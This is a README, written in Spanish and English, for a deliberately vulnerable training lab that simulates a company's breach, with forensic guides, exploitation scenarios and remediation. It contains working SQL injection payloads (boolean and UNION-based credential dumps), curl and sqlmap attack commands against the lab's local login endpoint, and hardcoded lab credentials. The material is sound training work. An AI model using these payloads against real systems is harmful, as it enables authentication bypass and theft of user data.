# TechSolutions S.A. - Laboratorio de Seguridad y Honeypot

**Laboratorio Educacional de Seguridad** - Un entorno vulnerable simulado para entrenamiento en ciberseguridad y análisis forense.

## Tabla de Contenidos

- [Descripción General](#descripción-general)
- [Configuración del Laboratorio](#configuración-del-laboratorio)
- [Arquitectura](#arquitectura)
- [Catálogo de Vulnerabilidades](#catálogo-de-vulnerabilidades)
- [Guía de Análisis Forense](#guía-de-análisis-forense)
- [Escenarios de Explotación](#escenarios-de-explotación)
- [Remediación](#remediación)
- [Objetivos de Aprendizaje](#objetivos-de-aprendizaje)
- [Descargo Legal](#descargo-legal)
- [Contribuciones](#contribuciones)
- [Licencia](#licencia)
- [Recursos](#recursos)

## Descripción General

TechSolutions S.A. es una empresa de software mediana simulada con una infraestructura deliberadamente vulnerable para propósitos de entrenamiento en seguridad. Este laboratorio contiene **5 problemas críticos de seguridad** comúnmente encontrados en entornos del mundo real:

1. **Bucket S3 Público** - Backups de base de datos expuestos
2. **Inyección SQL** - Formulario de login vulnerable
3. **Credenciales Comprometidas** - Acceso de administrador filtrado
4. **Ataque de Ransomware** - Servidores cifrados con artefactos forenses
5. **Filtración de Datos** - Información de clientes en foros de la web oscura

## Configuración del Laboratorio

### Prerrequisitos

- Docker y Docker Compose instalados
- Node.js 18+ y npm
- Git
- Al menos 2GB de RAM disponible
- Conocimiento básico de redes y ciberseguridad

### Inicio Rápido

```bash
# Clonar el repositorio
git clone https://github.com/yourusername/techsolutions-lab.git
cd techsolutions-lab

# Iniciar el entorno del laboratorio
docker-compose up -d

# Inicializar la base de datos
npm run init-db

# La aplicación web vulnerable ya está ejecutándose
# Acceder en: http://techsolutions.com.test:3000
```

### Acceder al Laboratorio

- **Aplicación Web**: http://techsolutions.com.test:3000
- **Base de Datos**: localhost:3306 (usuario: `root`, contraseña: `vulnerable123`)
- **Bucket S3 (simulado)**: directorio `./s3-bucket/`

### Configuración DNS

Agregar lo siguiente al archivo `/etc/hosts`:

```
127.0.0.1   techsolutions.com.test
127.0.0.1   www.techsolutions.com.test
127.0.0.1   admin.techsolutions.com.test
```

En Windows, editar `C:\Windows\System32\drivers\etc\hosts`

## Arquitectura

```
┌─────────────────────────────────────────────────────────┐
│                   TechSolutions Lab                      │
├─────────────────────────────────────────────────────────┤
│                                                           │
│  ┌──────────────┐    ┌──────────────┐    ┌───────────┐ │
│  │ Web App      │───▶│ MySQL DB     │    │ S3 Bucket │ │
│  │ (Express/TS) │    │ (Vulnerable) │    │ (Public)  │ │
│  │ Port: 3000   │    │ Port: 3306   │    │ /s3-bucket│ │
│  └──────────────┘    └──────────────┘    └───────────┘ │
│         │                                                 │
│         ▼                                                 │
│  ┌──────────────────────────────────────────────────┐   │
│  │              Logging System                       │   │
│  │  - Authentication logs (AUTH_*.log)              │   │
│  │  - Network traffic (NET_*.log)                   │   │
│  │  - Ransomware indicators (RANSOM_*.log)          │   │
│  └──────────────────────────────────────────────────┘   │
└─────────────────────────────────────────────────────────┘
```

## Catálogo de Vulnerabilidades

### 1. Bucket S3 Público (Severidad Alta)

**Ubicación**: `s3-bucket/backups/`

**Descripción**: Los archivos de backup de la base de datos son públicamente accesibles sin autenticación.

**Archivos Expuestos**:
- `db_backup_2025-10-15.sql` - Volcado completo de la base de datos
- `customer_data_export.csv` - PII de clientes
- `payment_records.json` - Información de pagos
- `credentials.txt` - Credenciales hardcodeadas

**Riesgo**: Brecha completa de datos, violaciones regulatorias (GDPR, PCI-DSS)

### 2. Inyección SQL (Severidad Crítica)

**Ubicación**: POST `/api/auth/login`

**Código Vulnerable**: `src/routes/auth.ts`

**Ejemplos de Payload**:
```sql
# Inyección booleana básica
Username: admin' OR 1=1-- 
Password: anything

# Inyección basada en comentarios
Username: admin'-- 
Password: (empty)

# Inyección basada en UNION
Username: ' UNION SELECT 1,username,password,email,role,created_at,updated_at FROM users-- 
Password: (empty)

# Inyección booleana alternativa
Username: admin' OR 'x'='x
Password: anything
```

**Riesgo**: Extracción completa de la base de datos, elusión de autenticación, manipulación de datos

### 3. Compromised Administrator Credentials

**Credenciales Filtradas**:
- Username: `carlos.admin@techsolutions.com`
- Password: `TechSol2024!Admin`
- Found in: External breach database (simulated in `s3-bucket/breaches/`)

**Access Level**: Full administrative privileges

**Riesgo**: Acceso no autorizado, escalación de privilegios, movimiento lateral

### 4. Ransomware Attack

**Archivos Afectados**: `ransomware/encrypted/`

**Indicadores**:
- File extension: `.locked`
- Ransom note: `README_DECRYPT.txt`
- Encryption timestamp: 2025-10-27 03:00:00 UTC
- Entry vector: Phishing email with malicious attachment

**Artefactos Forenses**:
- Initial access logs in `logs/AUTH_2025-10-27T10:01:32.log`
- Network connections in `logs/NET_2025-10-27T03:14:55.log`
- Process execution traces
- Registry modifications (simulated)

**Riesgo**: Interrupción del negocio, pérdida de datos, pago de rescate

### 5. Data Leaks on Dark Web Forums

**Ubicación**: `dark-web-leaks/forum_posts.txt`

**Información Filtrada**:
- 1,247 customer records
- Credit card numbers (last 4 digits)
- Email addresses and phone numbers
- Internal employee data

**Origen**: Combinación de exposición de bucket S3 y explotación de inyección SQL

## Guía de Análisis Forense

### Step 1: Initial Triage

```bash
# Check running containers
docker-compose ps

# Review recent logs
tail -f logs/*.log

# Check database connections
docker exec -it techsolutions-db mysql -u root -pvulnerable123 -e "SHOW PROCESSLIST;"
```

### Step 2: Analyze Authentication Logs

```bash
# Extract failed login attempts
grep "Failed login" logs/AUTH_*.log | wc -l

# Identify suspicious IPs
grep "Failed login" logs/AUTH_*.log | awk '{print $5}' | sort | uniq -c | sort -nr

# Timeline of admin access
grep "carlos.admin" logs/AUTH_*.log | sort

# Look for SQL injection patterns
grep -E "(UNION|SELECT|'--)" logs/AUTH_*.log
```

**Expected Findings**:
- Multiple failed logins from IP: `45.142.214.198` (suspicious)
- Successful admin login from unusual location: `185.220.101.47` (Tor exit node)
- SQL injection attempts between 02:00-03:00 UTC on 2025-10-27
- Pattern of enumeration attempts before successful breach

### Step 3: Network Traffic Analysis

```bash
# Analyze network logs
cat logs/NET_*.log

# Find data exfiltration
grep -E "(UPLOAD|POST|PUT)" logs/NET_*.log | grep -v "localhost"

# Identify C2 communication
grep -E "23.95.112|45.142.214" logs/NET_*.log

# Check for unusual ports
awk '{print $7}' logs/NET_*.log | sort | uniq -c
```

**Expected Findings**:
- Large data transfer to IP: `23.95.112.34:443` (1.2 GB)
- Connection to known malicious domain: `c2.ransomgang.onion`
- Periodic beacons every 60 seconds to C2 server
- Database dump download: 347 MB at 2025-10-27 02:47:33

### Step 4: Database Forensics

```bash
# Connect to database
docker exec -it techsolutions-db mysql -u root -pvulnerable123 techsolutions

# Check for unauthorized queries
SELECT * FROM mysql.general_log WHERE command_type = 'Query' AND argument LIKE '%UNION%';

# Identify data access patterns
SELECT user, COUNT(*) as queries FROM mysql.general_log GROUP BY user;

# Look for created backdoor accounts
SELECT * FROM users WHERE created_at > '2025-10-26' ORDER BY created_at DESC;

# Check for privilege escalation
SELECT * FROM users WHERE role = 'admin' ORDER BY updated_at DESC;
```

**Expected Findings**:
- Backdoor user created: `backup_svc` with admin privileges
- 1,247 customer records accessed via SQL injection
- Bulk export queries executed at 02:45 UTC
- Modified admin password for persistence

### Step 5: S3 Bucket Investigation

```bash
# List all files in simulated S3 bucket
ls -laR s3-bucket/

# Check file access times
find s3-bucket/ -type f -printf '%T+ %p\n' | sort

# Identify sensitive data
grep -r "password\|credit\|ssn" s3-bucket/

# Check for unauthorized modifications
git log --all --full-history -- s3-bucket/
```

**Expected Findings**:
- Last access: 2025-10-26 23:15:44 from IP: `45.142.214.198`
- Downloaded files: `db_backup_2025-10-15.sql`, `customer_data_export.csv`
- 3 unauthorized access attempts before successful download
- Files indexed by search engines (Google, Shodan)

### Step 6: Ransomware Analysis

```bash
# Examine ransom note
cat ransomware/README_DECRYPT.txt

# List encrypted files
find ransomware/encrypted/ -name "*.locked"

# Check for encryption markers
hexdump -C ransomware/encrypted/important_doc.pdf.locked | head

# Timeline reconstruction
stat ransomware/encrypted/*.locked

# Look for dropper artifacts
grep "ransomware\|encrypt\|.exe" logs/*.log
```

**Expected Findings**:
- Encryption started: 2025-10-27 03:14:22 UTC
- Entry vector: Phishing email attachment `Invoice_Q3_2025.pdf.exe`
- Ransomware family: `LockBit 3.0` (simulated)
- Bitcoin wallet for ransom: `1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa`
- Encryption key: AES-256 with RSA-2048 key exchange
- Total files encrypted: 847 files across 3 servers

### Step 7: Dark Web Leak Analysis

```bash
# Review leaked data
cat dark-web-leaks/forum_posts.txt

# Match leaked data with database
npm run check-leaks

# Timeline correlation
npm run correlate-timeline
```

**Expected Findings**:
- Data posted on: 2025-10-28 (1 day after ransomware)
- Forum: RaidForums mirror
- Seller: `DataBroker2025`
- Price: 0.5 BTC (~$25,000)
- Data matches S3 bucket + SQL injection extraction

### Step 8: Create Timeline of Attack

```bash
# Generate complete timeline
npm run generate-timeline

# Output: attack-timeline.md
```

**Complete Attack Timeline**:

```
2025-10-26 18:30:00 - Reconnaissance: Port scanning from 45.142.214.198
2025-10-26 19:45:12 - Discovery: S3 bucket found via Shodan
2025-10-26 23:15:44 - Exfiltration: S3 bucket downloaded (1.8 GB)
2025-10-27 01:30:00 - Exploitation: SQL injection attempts begin
2025-10-27 02:47:33 - Exfiltration: Database dump extracted (347 MB)
2025-10-27 03:00:15 - Initial Access: Phishing email with ransomware opened
2025-10-27 03:14:22 - Impact: Ransomware encryption begins
2025-10-27 06:30:00 - Discovery: IT team notices encrypted files
2025-10-27 10:01:32 - Response: Incident response initiated
2025-10-28 15:00:00 - Data Leak: Customer data posted on dark web forum
```

## Escenarios de Explotación

### Escenario 1: Ataque de Inyección SQL

**Objetivo**: Extraer todas las credenciales de usuario de la base de datos

**Pasos**:

1. **Identificar el punto de inyección**:
```bash
curl -X POST http://techsolutions.com.test:3000/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"test","password":"test"}'
```

2. **Probar inyección SQL**:
```bash
curl -X POST http://techsolutions.com.test:3000/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin'\'' OR 1=1-- ","password":"anything"}'
  -d '{"username":"admin'\'' OR 1=1-- ","password":"anything"}'

# Using PowerShell (Windows):
# Create payload file first:
echo '{"username":"admin'\'' OR 1=1-- ","password":"anything"}' > payload.json
Invoke-WebRequest -Uri "http://techsolutions.com.test:3000/api/auth/login" `
  -Method POST -ContentType "application/json" -InFile "payload.json"
```

3. **Extraer estructura de la base de datos**:
```bash
# Obtener nombres de tablas
curl -X POST http://techsolutions.com.test:3000/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"'\'' UNION SELECT 1,table_name,2,3,4,5,6 FROM information_schema.tables WHERE table_schema=database()-- ","password":""}'
```

4. **Volcar credenciales de usuario**:
```bash
curl -X POST http://techsolutions.com.test:3000/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"'\'' UNION SELECT 1,username,password,email,role,created_at,updated_at FROM users-- ","password":""}'
```

5. **Automatizar con SQLMap**:
```bash
sqlmap -u "http://techsolutions.com.test:3000/api/login" \
  --data='{"username":"test","password":"test"}' \
  --method=POST \
  --dbms=mysql \
  --dump
```

### Escenario 2: Explotación de Bucket S3

**Objetivo**: Acceder y descargar archivos de respaldo sensibles

**Pasos**:

1. **Listar contenido del bucket**:
```bash
ls -la s3-bucket/backups/
```

2. **Descargar respaldo de base de datos**:
```bash
cp s3-bucket/backups/db_backup_2025-10-15.sql ./
```

3. **Extraer credenciales**:
```bash
grep -i "password\|secret\|key" db_backup_2025-10-15.sql
```

4. **Analizar datos de clientes**:
```bash
cat s3-bucket/backups/customer_data_export.csv | wc -l
head -20 s3-bucket/backups/customer_data_export.csv
```

### Escenario 3: Ataque de Reutilización de Credenciales

**Objetivo**: Usar credenciales comprometidas para acceso no autorizado

**Pasos**:

1. **Obtener credenciales filtradas**:
```bash
cat s3-bucket/breaches/external_breach.txt | grep "techsolutions.com"
```

2. **Probar credenciales**:
```bash
curl -X POST http://techsolutions.com.test:3000/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"carlos.admin@techsolutions.com","password":"TechSol2024!Admin"}'
```

3. **Acceder al panel de administración**:
```bash
# Usar token de sesión obtenido
curl -X GET http://techsolutions.com.test:3000/api/admin/users \
  -H "Authorization: Bearer <token_from_step_2>"
```

### Escenario 4: Análisis Forense de Ransomware

**Objetivo**: Analizar el comportamiento del ransomware e identificar IOCs

**Pasos**:

1. **Examinar nota de rescate**:
```bash
cat ransomware/README_DECRYPT.txt
```

2. **Identificar archivos cifrados**:
```bash
find ransomware/encrypted/ -name "*.locked" -exec file {} \;
```

3. **Extraer metadatos de cifrado**:
```bash
npm run analyze-ransomware
```

4. **Buscar IOCs**:
```bash
# Hashes de archivos
md5sum ransomware/dropper/Invoice_Q3_2025.pdf.exe

# Indicadores de red
grep -E "C2|command|control" logs/NET_*.log
```

5. **Intentar recuperación**:
```bash
# Nota: En escenarios reales, la recuperación depende de la variante de ransomware
npm run simulate-recovery
```

## Remediación

### Solución 1: Asegurar Bucket S3

```bash
# En AWS de producción:
aws s3api put-bucket-acl --bucket techsolutions-backups --acl private
aws s3api put-public-access-block --bucket techsolutions-backups \
  --public-access-block-configuration \
  "BlockPublicAcls=true,IgnorePublicAcls=true,BlockPublicPolicy=true,RestrictPublicBuckets=true"
```

### Solución 2: Parchear Inyección SQL

Ver `src/routes/auth.secure.ts` para la versión parcheada usando consultas parametrizadas.

### Solución 3: Restablecer Credenciales Comprometidas

```sql
-- Revocar acceso de administrador comprometido
UPDATE users SET password = SHA2('NewSecurePassword123!', 256), 
                 force_password_change = 1 
WHERE username = 'carlos.admin@techsolutions.com';

-- Habilitar MFA para todas las cuentas de administrador
UPDATE users SET mfa_enabled = 1 WHERE role = 'admin';
```

### Solución 4: Prevención de Ransomware

- Implementar filtrado de email y sandboxing
- Desplegar solución EDR
- Respaldos offline regulares (regla 3-2-1)
- Segmentación de red
- Lista blanca de aplicaciones

### Solución 5: Respuesta a Filtración de Datos

- Notificar a clientes afectados (requerimiento GDPR)
- Ofrecer servicios de monitoreo de crédito
- Reportar a la autoridad de protección de datos
- Realizar auditoría de seguridad
- Implementar solución DLP

## Objetivos de Aprendizaje

Después de completar este laboratorio, deberías poder:

- Identificar y explotar vulnerabilidades comunes de aplicaciones web
- Realizar análisis forense en sistemas comprometidos
- Correlacionar múltiples fuentes de datos para construir líneas de tiempo de ataques
- Entender la cadena de muerte de un ataque multi-etapa
- Implementar controles de seguridad y estrategias de remediación
- Escribir reportes integrales de respuesta a incidentes

## Descargo Legal

Este laboratorio es **SOLO PARA PROPÓSITOS EDUCACIONALES**. No uses estas técnicas contra sistemas que no posees o para los que no tienes permiso explícito para probar. El acceso no autorizado a sistemas informáticos es ilegal y punible por ley.

## Contribuciones

¡Las contribuciones son bienvenidas! Por favor, siéntete libre de enviar pull requests para agregar nuevos escenarios o mejorar los existentes.

## Licencia

Licencia MIT - Ver archivo LICENSE para detalles

## Recursos

- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [MITRE ATT&CK Framework](https://attack.mitre.org/)
- [NIST Cybersecurity Framework](https://www.nist.gov/cyberframework)
- [SANS Digital Forensics](https://www.sans.org/cyber-security-courses/advanced-incident-response-threat-hunting-training/)

---

**Creado con propósitos educacionales por la comunidad de ciberseguridad**
